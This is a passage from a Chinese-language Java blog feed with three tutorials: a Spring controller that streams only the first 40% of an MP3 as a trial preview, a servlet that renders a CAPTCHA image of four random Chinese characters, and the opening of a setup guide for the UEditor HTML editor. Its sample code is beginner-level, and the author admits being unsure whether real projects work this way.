<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.xxz.testaudio;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PathVariable;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.ModelAndView;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/player"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PlayerController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@RequestMapping</span>(value = <span class="string">"/&#123;id&#125;"</span>)</span><br><span class="line">	<span class="function"><span class="keyword">public</span> ModelAndView <span class="title">getAudio</span><span class="params">(@PathVariable String id, HttpServletRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">			HttpServletResponse response)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"id: "</span> + id);</span><br><span class="line"></span><br><span class="line">                String range = request.getHeader(<span class="string">"Range"</span>);</span><br><span class="line">                String[] rs = range.split(<span class="string">"\\="</span>);</span><br><span class="line">                range = rs[<span class="number">1</span>].split(<span class="string">"\\-"</span>)[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">                String path = request.getServletContext().getRealPath(<span class="string">"/"</span>);</span><br><span class="line">		File file = <span class="keyword">new</span> File(path + <span class="string">"/WEB-INF/mp3/"</span> + id + <span class="string">".mp3"</span>);</span><br><span class="line">		<span class="keyword">if</span>(!file.exists()) <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">"音频文件不存在 --&gt; 404"</span>);</span><br><span class="line">		OutputStream os = response.getOutputStream();</span><br><span class="line">		FileInputStream fis = <span class="keyword">new</span> FileInputStream(file);</span><br><span class="line">		<span class="keyword">long</span> length = file.length();</span><br><span class="line">		System.out.println(<span class="string">"file length : "</span> + length);</span><br><span class="line">		<span class="comment">// 播放进度</span></span><br><span class="line">		<span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">		<span class="comment">// 播放百分比</span></span><br><span class="line">		<span class="keyword">int</span> percent = (<span class="keyword">int</span>)(length * <span class="number">0.4</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">int</span> irange = Integer.parseInt(range);</span><br><span class="line">                length = length - irange;</span><br><span class="line"></span><br><span class="line">                response.addHeader(<span class="string">"Accept-Ranges"</span>, <span class="string">"bytes"</span>);</span><br><span class="line">                response.addHeader(<span class="string">"Content-Length"</span>, length + <span class="string">""</span>);</span><br><span class="line">                response.addHeader(<span class="string">"Content-Range"</span>, <span class="string">"bytes "</span> + range + <span class="string">"-"</span> + length + <span class="string">"/"</span> + length);</span><br><span class="line">                response.addHeader(<span class="string">"Content-Type"</span>, <span class="string">"audio/mpeg;charset=UTF-8"</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">		<span class="keyword">while</span> ((len = fis.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">			os.write(b, <span class="number">0</span>, len);</span><br><span class="line">			count += len;</span><br><span class="line">			<span class="keyword">if</span>(count &gt;= percent)&#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		System.out.println(<span class="string">"count: "</span> + count + <span class="string">", percent: "</span> + percent);</span><br><span class="line">		fis.close();</span><br><span class="line">		os.close();</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>页面编写：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">page</span> <span class="attr">language</span>=<span class="string">"java"</span> <span class="attr">contentType</span>=<span class="string">"text/html; charset=UTF-8"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">pageEncoding</span>=<span class="string">"UTF-8"</span>%&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE HTML&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>audio<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">"$&#123;pageContext.request.contextPath&#125;/player/zj-ywaqldbry.mp3"</span> <span class="attr">controls</span>=<span class="string">"controls"</span>&gt;</span></span><br><span class="line">		Your browser does not support the audio tag.</span><br><span class="line">	<span class="tag">&lt;/<span class="name">audio</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里只能播放视频文件的40%的内容。</p>
<p>在这里可以做到一个控制，比如你在用html5做项目中，有写播放的音频需要收费，但是你又只能让用户试听一部分的内容，那么你就可以这样实现。</p>
<p>不知道实际项目中是不是这么控制的。</p>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> java </tag>
            
            <tag> html5 </tag>
            
            <tag> audio </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[java验证码]]></title>
      <url>/2014/java-checkcode/</url>
      <content type="html"><![CDATA[<p>这篇文章主要讲解如何用java实现验证码<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line">package org.xxz.checkcode;</span><br><span class="line"></span><br><span class="line">import java.awt.Color;</span><br><span class="line">import java.awt.Font;</span><br><span class="line">import java.awt.Graphics;</span><br><span class="line">import java.awt.Graphics2D;</span><br><span class="line">import java.awt.image.BufferedImage;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.util.Random;</span><br><span class="line">import javax.imageio.ImageIO;</span><br><span class="line">import javax.servlet.ServletException;</span><br><span class="line">import javax.servlet.http.HttpServlet;</span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line">import javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line">public class CheckCode extends HttpServlet</span><br><span class="line">&#123;</span><br><span class="line">	private static final long serialVersionUID = 1L;</span><br><span class="line"></span><br><span class="line">	private static final int	WIDTH	= 120;</span><br><span class="line">	private static final int	HEIGHT	= 35;</span><br><span class="line"></span><br><span class="line">	public void doGet( HttpServletRequest request, HttpServletResponse response )</span><br><span class="line">	throws ServletException, IOException</span><br><span class="line">	&#123;</span><br><span class="line">		try &#123;</span><br><span class="line">			test( request, response );</span><br><span class="line">		&#125; catch ( Exception e ) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	public void doPost( HttpServletRequest request, HttpServletResponse response )</span><br><span class="line">	throws ServletException, IOException</span><br><span class="line">	&#123;</span><br><span class="line">		doGet( request, response );</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	public void test( HttpServletRequest request, HttpServletResponse response ) throws Exception</span><br><span class="line">	&#123;</span><br><span class="line">		BufferedImage	image	= new BufferedImage( WIDTH, HEIGHT, BufferedImage.TYPE_INT_RGB );</span><br><span class="line">		Graphics	g	= image.getGraphics();</span><br><span class="line">/* 设置背景色 */</span><br><span class="line">		setBackGround( g );</span><br><span class="line">/* 设置边框 */</span><br><span class="line">		setBorder( g );</span><br><span class="line">/* 画干扰线 */</span><br><span class="line">		drawRandomLine( g );</span><br><span class="line">/* 写随机数 */</span><br><span class="line">		String random = drawRandomNum( (Graphics2D) g );</span><br><span class="line">		request.getSession().setAttribute( &quot;checkcode&quot;, random );</span><br><span class="line">/* 这三个头是决定所有的浏览器不缓存 */</span><br><span class="line">		response.setDateHeader( &quot;expries&quot;, -1 );</span><br><span class="line">		response.setHeader( &quot;Cache-Control&quot;, &quot;no-cache&quot; );</span><br><span class="line">		response.setHeader( &quot;Pragma&quot;, &quot;no-cache&quot; );</span><br><span class="line">		ImageIO.write( image, &quot;jpg&quot;, response.getOutputStream() );</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	private void drawRandomLine( Graphics g )</span><br><span class="line">	&#123;</span><br><span class="line">		g.setColor( Color.GREEN );</span><br><span class="line">		for ( int i = 0; i &lt; 6; i++ )</span><br><span class="line">		&#123;</span><br><span class="line">			int	x1	= new Random().nextInt( WIDTH );</span><br><span class="line">			int	y1	= new Random().nextInt( HEIGHT );</span><br><span class="line"></span><br><span class="line">			int	x2	= new Random().nextInt( WIDTH );</span><br><span class="line">			int	y2	= new Random().nextInt( HEIGHT );</span><br><span class="line"></span><br><span class="line">			g.drawLine( x1, y1, x2, y2 );</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	private String drawRandomNum( Graphics2D g )</span><br><span class="line">	&#123;</span><br><span class="line">		g.setColor( Color.RED );</span><br><span class="line">		g.setFont( new Font( &quot;宋体&quot;, Font.BOLD, 20 ) );</span><br><span class="line"></span><br><span class="line">		String		cnCode	= &quot;\u7684\u4e00\u662f\u4e86\u6211\u4e0d\u4eba\u5728\u4ed6\u6709\u8fd9\u4e2a\u4e0a\u4eec\u6765\u5230\u65f6\u5927\u5730\u4e3a\u5b50\u4e2d\u4f60\u8bf4\u751f\u56fd\u5e74\u7740\u5c31\u90a3\u548c\u8981\u5979\u51fa\u4e5f\u5f97\u91cc\u540e\u81ea\u4ee5\u4f1a\u5bb6\u53ef\u4e0b\u800c\u8fc7\u5929\u53bb\u80fd\u5bf9\u5c0f\u591a\u7136\u4e8e\u5fc3\u5b66\u4e48\u4e4b\u90fd\u597d\u770b\u8d77\u53d1\u5f53\u6ca1\u6210\u53ea\u5982\u4e8b\u628a\u8fd8\u7528\u7b2c\u6837\u9053\u60f3\u4f5c\u79cd\u5f00\u7f8e\u603b\u4ece\u65e0\u60c5\u5df1\u9762\u6700\u5973\u4f46\u73b0\u524d\u4e9b\u6240\u540c\u65e5\u624b\u53c8\u884c\u610f\u52a8\u65b9\u671f\u5b83\u5934\u7ecf\u957f\u513f\u56de\u4f4d\u5206\u7231\u8001\u56e0\u5f88\u7ed9\u540d\u6cd5\u95f4\u65af\u77e5\u4e16\u4ec0\u4e24\u6b21\u4f7f\u8eab\u8005\u88ab\u9ad8\u5df2\u4eb2\u5176\u8fdb\u6b64\u8bdd\u5e38\u4e0e\u6d3b\u6b63\u611f\u89c1\u660e\u95ee\u529b\u7406\u5c14\u70b9\u6587\u51e0\u5b9a\u672c\u516c\u7279\u505a\u5916\u5b69\u76f8\u897f\u679c\u8d70\u5c06\u6708\u5341\u5b9e\u5411\u58f0\u8f66\u5168\u4fe1\u91cd\u4e09\u673a\u5de5\u7269\u6c14\u6bcf\u5e76\u522b\u771f\u6253\u592a\u65b0\u6bd4\u624d\u4fbf\u592b\u518d\u4e66\u90e8\u6c34\u50cf\u773c\u7b49\u4f53\u5374\u52a0\u7535\u4e3b\u754c\u95e8\u5229\u6d77\u53d7\u542c\u8868\u5fb7\u5c11\u514b\u4ee3\u5458\u8bb8\u7a1c\u5148\u53e3\u7531\u6b7b\u5b89\u5199\u6027\u9a6c\u5149\u767d\u6216\u4f4f\u96be\u671b\u6559\u547d\u82b1\u7ed3\u4e50\u8272\u66f4\u62c9\u4e1c\u795e\u8bb0\u5904\u8ba9\u6bcd\u7236\u5e94\u76f4\u5b57\u573a\u5e73\u62a5\u53cb\u5173\u653e\u81f3\u5f20\u8ba4\u63a5\u544a\u5165\u7b11\u5185\u82f1\u519b\u5019\u6c11\u5c81\u5f80\u4f55\u5ea6\u5c71\u89c9\u8def\u5e26\u4e07\u7537\u8fb9\u98ce\u89e3\u53eb\u4efb\u91d1\u5feb\u539f\u5403\u5988\u53d8\u901a\u5e08\u7acb\u8c61\u6570\u56db\u5931\u6ee1\u6218\u8fdc\u683c\u58eb\u97f3\u8f7b\u76ee\u6761\u5462\u75c5\u59cb\u8fbe\u6df1\u5b8c\u4eca\u63d0\u6c42\u6e05\u738b\u5316\u7a7a\u4e1a\u601d\u5207\u600e\u975e\u627e\u7247\u7f57\u94b1\u7d36\u5417\u8bed\u5143\u559c\u66fe\u79bb\u98de\u79d1\u8a00\u5e72\u6d41\u6b22\u7ea6\u5404\u5373\u6307\u5408\u53cd\u9898\u5fc5\u8be5\u8bba\u4ea4\u7ec8\u6797\u8bf7\u533b\u665a\u5236\u7403\u51b3\u7aa2\u4f20\u753b\u4fdd\u8bfb\u8fd0\u53ca\u5219\u623f\u65e9\u9662\u91cf\u82e6\u706b\u5e03\u54c1\u8fd1\u5750\u4ea7\u7b54\u661f\u7cbe\u89c6\u4e94\u8fde\u53f8\u5df4\u5947\u7ba1\u7c7b\u672a\u670b\u4e14\u5a5a\u53f0\u591c\u9752\u5317\u961f\u4e45\u4e4e\u8d8a\u89c2\u843d\u5c3d\u5f62\u5f71\u7ea2\u7238\u767e\u4ee4\u5468\u5427\u8bc6\u6b65\u5e0c\u4e9a\u672f\u7559\u5e02\u534a\u70ed\u9001\u5174\u9020\u8c08\u5bb9\u6781\u968f\u6f14\u6536\u9996\u6839\u8bb2\u6574\u5f0f\u53d6\u7167\u529e\u5f3a\u77f3\u53e4\u534e\u8ae3\u62ff\u8ba1\u60a8\u88c5\u4f3c\u8db3\u53cc\u59bb\u5c3c\u8f6c\u8bc9\u7c73\u79f0\u4e3d\u5ba2\u5357\u9886\u8282\u8863\u7ad9\u9ed1\u523b\u7edf\u65ad\u798f\u57ce\u6545\u5386\u60ca\u8138\u9009\u5305\u7d27\u4e89\u53e6\u5efa\u7ef4\u7edd\u6811\u7cfb\u4f24\u793a\u613f\u6301\u5343\u53f2\u8c01\u51c6\u8054\u5987\u7eaa\u57fa\u4e70\u5fd7\u9759\u963f\u8bd7\u72ec\u590d\u75db\u6d88\u793e\u7b97\u4e49\u7adf\u786e\u9152\u9700\u5355\u6cbb\u5361\u5e78\u5170\u5ff5\u4e3e\u4ec5\u949f\u6015\u5171\u6bdb\u53e5\u606f\u529f\u5b98\u5f85\u7a76\u8ddf\u7a7f\u5ba4\u6613\u6e38\u7a0b\u53f7\u5c45\u8003\u7a81\u76ae\u54ea\u8d39\u5012\u4ef7\u56fe\u5177\u521a\u8111\u6c38\u6b4c\u54cd\u5546\u793c\u7ec6\u4e13\u9ec4\u5757\u811a\u5473\u7075\u6539\u636e\u822c\u7834\u5f15\u98df\u4ecd\u5b58\u4f17\u6ce8\u7b14\u751a\u67d0\u6c89\u8840\u5907\u4e60\u6821\u9ed8\u52a1\u571f\u5fae\u5a18\u987b\u8bd5\u6000\u6599\u8c03\u5e7f\u8716\u82cf\u663e\u8d5b\u67e5\u5bc6\u8bae\u5e95\u5217\u5bcc\u68a6\u9519\u5ea7\u53c2\u516b\u9664\u8dd1\u4eae\u5047\u5370\u8bbe\u7ebf\u6e29\u867d\u6389\u4eac\u521d\u517b\u9999\u505c\u9645\u81f4\u9633\u7eb8\u674e\u7eb3\u9a8c\u52a9\u6fc0\u591f\u4e25\u8bc1\u5e1d\u996d\u5fd8\u8da3\u652f\u6625\u96c6\u4e08\u6728\u7814\u73ed\u666e\u5bfc\u987f\u7761\u5c55\u8df3\u83b7\u827a\u516d\u6ce2\u5bdf\u7fa4\u7687\u6bb5\u6025\u5ead\u521b\u533a\u5965\u5668\u8c22\u5f1f\u5e97\u5426\u5bb3\u8349\u6392\u80cc\u6b62\u7ec4\u5dde\u671d\u5c01\u775b\u677f\u89d2\u51b5\u66f2\u9986\u80b2\u5fd9\u8d28\u6cb3\u7eed\u54e5\u547c\u82e5\u63a8\u5883\u9047\u96e8\u6807\u59d0\u5145\u56f4\u6848\u4f26\u62a4\u51b7\u8b66\u8d1d\u8457\u96ea\u7d22\u5267\u554a\u8239\u9669\u70df\u4f9d\u6597\u503c\u5e2e\u6c49\u6162\u4f5b\u80af\u95fb\u5531\u6c99\u5c40\u4f2f\u65cf\u4f4e\u73a9\u8d44\u5c4b\u51fb\u901f\u987e\u6cea\u6d32\u56e2\u5723\u65c1\u5802\u5175\u4e03\u9732\u56ed\u725b\u54ed\u65c5\u8857\u52b3\u578b\u70c8\u59d1\u9648\u83ab\u9c7c\u5f02\u62b1\u5b9d\u6743\u9c81\u7b80\u6001\u7ea7\u7968\u602a\u5bfb\u6740\u5f8b\u80dc\u4efd\u6c7d\u53f3\u6d0b\u8303\u5e8a\u821e\u79d8\u5348\u767b\u697c\u8d35\u5438\u8d23\u4f8b\u8ffd\u8f83\u804c\u5c5e\u6e10\u5de6\u5f55\u4e1d\u7259\u515a\u7ee7\u6258\u8d76\u7ae0\u667a\u51b2\u53f6\u80e1\u5409\u5356\u575a\u559d\u8089\u9057\u6551\u4fee\u677e\u4e34\u85cf\u62c5\u620f\u5584\u536b\u836f\u60b2\u6562\u9760\u4f0a\u6751\u6234\u8bcd\u68ee\u8033\u5dee\u77ed\u7956\u4e91\u89c4\u7a97\u6563\u8ff7\u6cb9\u65e7\u9002\u4e61\u67b6\u6069\u6295\u5f39\u94c1\u535a\u96f7\u5e9c\u538b\u8d85\u8d1f\u52d2\u6742\u9192\u6d17\u91c7\u6beb\u5634\u6bd5\u4e5d\u51b0\u65e2\u72b6\u4e71\u666f\u5e2d\u73cd\u7ae5\u9876\u6d3e\u7d20\u8131\u519c\u7591\u7ec3\u91ce\u6309\u72af\u62cd\u5f81\u574f\u9aa8\u4f59\u627f\u7f6e\u81d3\u5f69\u706f\u5de8\u7434\u514d\u73af\u59c6\u6697\u6362\u6280\u7ffb\u675f\u589e\u5fcd\u9910\u6d1b\u585e\u7f3a\u5fc6\u5224\u6b27\u5c42\u4ed8\u9635\u739b\u6279\u5c9b\u9879\u72d7\u4f11\u61c2\u6b66\u9769\u826f\u6076\u604b\u59d4\u62e5\u5a1c\u5999\u63a2\u5440\u8425\u9000\u6447\u5f04\u684c\u719f\u8bfa\u5ba3\u94f6\u52bf\u5956\u5bab\u5ffd\u5957\u5eb7\u4f9b\u4f18\u8bfe\u9e1f\u558a\u964d\u590f\u56f0\u5218\u7f6a\u4ea1\u978b\u5065\u6a21\u8d25\u4f34\u5b88\u6325\u9c9c\u8d22\u5b64\u67aa\u7981\u6050\u4f19\u6770\u8ff9\u59b9\u85f8\u904d\u76d6\u526f\u5766\u724c\u6c5f\u987a\u79cb\u8428\u83dc\u5212\u6388\u5f52\u6d6a\u542c\u51e1\u9884\u5976\u96c4\u5347\u7883\u7f16\u5178\u888b\u83b1\u542b\u76db\u6d4e\u8499\u68cb\u7aef\u817f\u62db\u91ca\u4ecb\u70e7\u8bef&quot;;</span><br><span class="line">		StringBuffer	sb	= new StringBuffer();</span><br><span class="line">/* 汉字区间 [\u4e00-\u9fa5] */</span><br><span class="line">		int x = 5;</span><br><span class="line">		for ( int i = 0; i &lt; 4; i++ )</span><br><span class="line">		&#123;</span><br><span class="line">			int	degree	= new Random().nextInt() % 30;</span><br><span class="line">			String	ch	= cnCode.charAt( new Random().nextInt( cnCode.length() ) ) + &quot;&quot;;</span><br><span class="line">			sb.append( ch );</span><br><span class="line">/* 设置旋转的弧度 */</span><br><span class="line">			g.rotate( degree * Math.PI / 180, x, 20 );</span><br><span class="line">			g.drawString( ch, x, 20 );</span><br><span class="line">			g.rotate( -degree * Math.PI / 180, x, 20 );</span><br><span class="line">			x += 30;</span><br><span class="line">		&#125;</span><br><span class="line">		return(sb.toString() );</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	private void setBackGround( Graphics g )</span><br><span class="line">	&#123;</span><br><span class="line">		g.setColor( Color.WHITE );</span><br><span class="line">		g.fillRect( 0, 0, WIDTH, HEIGHT );</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	private void setBorder( Graphics g )</span><br><span class="line">	&#123;</span><br><span class="line">		g.setColor( Color.BLUE );</span><br><span class="line">		g.drawRect( 1, 1, WIDTH - 2, HEIGHT - 2 );</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>显 示 4 个 中文字 符</p>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> java </tag>
            
            <tag> 验证码 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[UEditor的使用]]></title>
      <url>/2014/ueditor-use-and-config/</url>
      <content type="html"><![CDATA[<p>最近的开发一个模块，要使用的html编辑器</p>
<p>最开始想使用fckeditor，但是是外国的开发人员开发的，不过人性化。</p>
<p>我决定使用百度团队开发的ueditor</p>
<a id="more"></a>
<p>首先下载该使用该插件：<a href="http://ueditor.baidu.com/build/build_down.php?n=ueditor&amp;v=1_4_3-utf8-jsp" target="_blank" rel="noopener">http://ueditor.baidu.com/build/build_down.php?n=ueditor&amp;v=1_4_3-utf8-jsp</a></p>
<p>首先看文档：<a href="http://fex-team.github.io/ueditor/" target="_blank" rel="noopener">http://fex-team.github.io/ueditor/</a> 文档中的例子写的很详细</p>
<p>使用的过程中，主要看配置：<a href="http://fex-team.github.io/ueditor/#start-config" target="_blank" rel="noopener">http://fex-team.github.io/ueditor/#start-config</a></p>
<p>在使用的过程中，把解压包解压，在你的webapp目录下创建一个ue的文件夹，把你下载的插件包解压，</p>
<p>这些文件夹需要复制到ue文件夹下：</p>
<p><img src="https://ws1.sinaimg.cn/large/afc434bdly1fknvwzsahnj20h80akadj.jpg" alt=""></p>
<p>图中画红框的是需要复制到目录下的文件。</p>
<p>然后在你需要用到该html编辑器的文件中写下如下代码：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"/test/add.action"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">!-加载编辑器的容器</span> <span class="attr">--</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">id</span>=<span class="string">"container"</span> <span class="attr">name</span>=<span class="string">"content"</span> <span class="attr">type</span>=<span class="string">"text/plain"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">            这里写你的初始化内容</span></span><br><span class="line"><span class="undefined">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!-配置文件</span> <span class="attr">--</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"ueditor.config.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!-编辑器源码文件</span> <span class="attr">--</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"ueditor.all.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!-实例化编辑器</span> <span class="attr">--</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> editor = UE.getEditor(<span class="string">'container'</span>);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
